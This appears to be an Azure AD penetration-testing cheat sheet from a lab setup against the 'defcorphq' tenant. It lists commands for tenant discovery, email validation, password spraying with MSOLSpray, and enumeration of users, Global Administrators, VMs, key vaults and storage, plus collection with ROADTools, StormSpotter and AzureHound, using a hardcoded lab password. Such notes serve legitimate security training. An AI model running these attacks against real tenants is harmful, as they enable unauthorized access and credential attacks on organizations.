**Password**
```
SuperS3Cr31PAssw0rd!@l33t
```

- Get if Azure tenant is in use, tenant name and Federation
```powershell
https://login.microsoftonline.com/getuserrealm.srf?login
=[USERNAME@DOMAIN]&xml=1
```
- Get the Tenant ID
```powershell
https://login.microsoftonline.com/[DOMAIN]/.wellknown/openid-configuration
```
- Validate Email ID by sending requests to
```powershell
https://login.microsoftonline.com/common/GetCredentialType
```


### Is the organization using Azure AD?
```powershell
Import-Module C:\AzAD\Tools\AADInternals\AADInternals.psd1
Get-AADIntLoginInformation -UserName nonexistsuser@defcorphq.onmicrosoft.com
```

### ID of Tenant
```powershell
Get-AADIntTenantID -Domain defcorphq.onmicrosoft.com
```

### Validate email IDs 
```python
o365creeper.py -f C:\AzAD\Tools\emails.txt -o C:\AzAD\Tools\validemails.txt
```

### Azure Services used by the organization
```powershell
. C:\AzAD\Tools\MicroBurst\Misc\InvokeEnumerateAzureSubDomains.ps1
Invoke-EnumerateAzureSubDomains -Base defcorphq -Verbose
```

### Brute-force one of the users
```powershell
. C:\AzAD\Tools\MSOLSpray\MSOLSpray.ps1
Invoke-MSOLSpray -UserList C:\AzAD\Tools\validemails.txt -Password SuperVeryEasytoGuessPAssw0rd!@222 -Verbose
```

**Azure Blobs**
```powershell
 . C:\AzAD\Tools\MicroBurst\Misc\Invoke-EnumerateAzureBlobs.ps1
 Invoke-EnumerateAzureBlobs -Base defcorphq -Verbose
```

**Enumerate Azure Subdomains**
```powershell
. C:\AzAD\Tools\MicroBurst\Misc\Invoke-EnumerateAzureSubdomains.ps1
Invoke-EnumerateAzureSubDomains -Base defcorphq -Verbose
```

### Connect AzureAD via Powershell  
```powershell
$passwd = ConvertTo-SecureString "SuperS3Cr31PAssw0rd!@l33t"  -AsPlainText -Force
$creds = New-Object System.Management.Automation.PSCredential ("test@defcorphq.onmicrosoft.com", $passwd)
Connect-AzureAD -Credential $creds
```


### Enumerate with AzureADPreview
```powershell
Import-Module C:\AzAD\Tools\AzureADPreview\AzureADPreview.psd1
```

***Enumerate All Users*** <br>
```powershell
Get-AzureADUser -All $true
```

***List only the UPNs of the users*** <br>
```powershell
Get-AzureADUser -All $true | select UserPrincipalName
```

***List all the groups*** <br>
```powershell
Get-AzureADGroup -All $true
```

***List all the devices*** <br>
```powershell
Get-AzureADDevice
```

***Get all the Global Administrators*** <br>
```powershell
Get-AzureADDirectoryRole -Filter "DisplayName eq 'Global Administrator'" | Get-AzureADDirectoryRoleMember
```

***List custom roles with AzureADPreview*** <br>
```powershell
Import-Module C:\AzAD\Tools\AzureADPreview\AzureADPreview.psd1
$passwd = ConvertTo-SecureString "SuperS3Cr31PAssw0rd!@l33t"  -AsPlainText -Force
$creds = New-Object System.Management.Automation.PSCredential ("test@defcorphq.onmicrosoft.com", $passwd)
Connect-AzureAD -Credential $creds
Get-AzureADMSRoleDefinition | ?{$_.IsBuiltin -eq $False} | select DisplayName
```

***List All Custom Directory Roles***
```powershell
Get-AzureADMSRoleDefinition | ?{$_.IsBuiltin -eq $False} | select DisplayName
```

## Az Powershell Module
***Connect via Az Powershell Module***
```powershell
$passwd = ConvertTo-SecureString "SuperS3Cr31PAssw0rd!@l33t" -AsPlainText -Force
$creds = New-Object System.Management.Automation.PSCredential("test@defcorphq.onmicrosoft.com", $passwd)
Connect-AzAccount -Credential $creds
```

***List All Resources Accessible to the current account***
```powershell
Get-AzResource
```

***Get all the role asssignments for the user***
```powershell
Get-AzRoleAssignment -SignInName test@defcorphq.onmicrosoft.com
```


***List all the VMs where the current user has at least the Reader role***
```powershell
Get-AzVM | fl
```

***List all App Services***
```powershell
Get-AzWebApp 
Get-AzWebApp | ?{$_.Kind -notmatch "functionapp"}
```

***List all Function Apps***
```powershell
Get-AzFunctionApp
```

***List Storage Accounts***
```powershell
Get-AzStorageAccount | fl
```


***List readeble Key Vaults for the current user***
```powershell
Get-AzKeyVault
```


## Az Cli 
***Login via Az cli***
```powershell
az login -u test@defcorphq.onmicrosoft.com -p SuperS3Cr31PAssw0rd!@l33t
```

***List all VMs***
```powershell
az vm list
az vm list --query "[].[name]" -o table
```

***List all App Services***
```powershell
az webapp list
az webapp list --query "[].[name]" -o table
```
***List Function Apps***
```powershell
az functionapp list --query "[].[name]" -o table
```


***List Storage Accounts***
```powershell
az storage account list
```

***List keyvaults***
```powershell
az keyvault list
```

## ROADTools
Have to run powershell with admin privs. if you get an access denied error:
```powershell
cd c:\AzAD\Tools\ROADTools
pipenv shell
```

***Authenticate with test user and run GUI***
```powershell
roadrecon gather
roadrecon gui
```

## StormSpotter
**Start FrontEnd & Backend**
Start the backend service for StormSpotter
```powershell
cd C:\AzAD\Tools\stormspotter\backend\
pipenv shell
python ssbackend.pyz
```
Start the frontend webserver
```powershell
cd C:\AzAD\Tools\stormspotter\frontend\dist\spa\
quasar.cmd server -p 9091 --history
```

***Run Stormcollector***
```powershell
cd C:\AzAD\Tools\stormspotter\stormcollector\
pipenv shell
az login -u test@defcorphq.onmicrosoft.com -p SuperS3Cr31PAssw0rd!@l33t
python C:\AzAD\Tools\stormspotter\stormcollector\sscollector.pyz cli
```

## BloodHound 
- Connect to Azure using Az Powershell and Azure AD modules
```powershell
$passwd = ConvertTo-SecureString "SuperS3Cr31PAssw0rd!@l33t" -AsPlainText -Force
$creds = New-Object System.Management.Automation.PSCredential("test@defcorphq.onmicrosoft.com",$passwd)
Connect-AzAccount -Credential $creds

Import-Module C:\AzAD\Tools\AzureAD\AzureAD.psd1
Connect-AzureAD -Credential $creds
```

- Load AzureHound
```powershell
. C:\AzAD\Tools\AzureHound\AzureHound.ps1
Invoke-AzureHound -Verbose
```


